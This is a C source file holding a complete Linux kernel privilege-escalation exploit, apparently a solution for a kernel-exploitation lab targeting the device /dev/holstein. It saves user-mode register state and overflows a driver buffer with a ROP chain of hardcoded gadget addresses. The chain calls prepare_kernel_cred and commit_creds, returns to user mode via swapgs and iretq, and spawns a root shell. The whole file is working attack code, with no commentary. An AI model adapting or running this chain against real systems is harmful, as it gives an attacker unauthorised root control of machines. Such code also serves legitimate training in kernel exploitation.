#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void *cs;
void *rflags;
void *rsp;
void *ss;

void *(*prepare_kernel_cred)(void *)	= (void *)0xffffffff8106e240;
int (*commit_creds)(void *)		= (void *)0xffffffff8106e390;

void *pop_rdi_xor_al_0_ret		= (void *)0xffffffff812abdfd;
void *pop_rcx_xor_al_0_ret		= (void *)0xffffffff812ac83f;
void *mov_rdi_rax_rep_movsq		= (void *)0xffffffff8160c96b;
void *swapgs_ret			= (void *)0xffffffff8160bfac;
void *add_al_ch_iretq			= (void *)0xffffffff811f56c2;

static void save_state(void)
{
	asm volatile("movq %%cs, %[cs]\n\t"
		     "pushfq\n\t"
		     "popq %[rflags]\n\t"
		     "movq %%rsp, %[rsp]\n\t"
		     "movq %%ss, %[ss]"
		     : [cs] "=r"(cs), [rflags] "=r"(rflags), [rsp] "=r"(rsp),
		       [ss] "=r"(ss));
}

static void shell(void)
{
	puts("[+] get r00t!");
	execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
}

int main(void)
{
	unsigned char data[0x500] = { 0 };
	void **rop_chain;
	int fd;

	save_state();

	fd = open("/dev/holstein", O_RDWR);
	if (fd == -1) {
		perror("[-] open");
		return EXIT_FAILURE;
	}

	rop_chain = (void **)&data[0x408];
	*rop_chain++ = pop_rdi_xor_al_0_ret;
	*rop_chain++ = 0;
	*rop_chain++ = prepare_kernel_cred;
	*rop_chain++ = pop_rcx_xor_al_0_ret;
	*rop_chain++ = 0;
	*rop_chain++ = mov_rdi_rax_rep_movsq;
	*rop_chain++ = commit_creds;
	*rop_chain++ = swapgs_ret;
	*rop_chain++ = add_al_ch_iretq;
	*rop_chain++ = shell;
	*rop_chain++ = cs;
	*rop_chain++ = rflags;
	*rop_chain++ = rsp;
	*rop_chain++ = ss;
	write(fd, data, (void *)rop_chain - (void *)data);

	close(fd);
	return EXIT_SUCCESS;
}
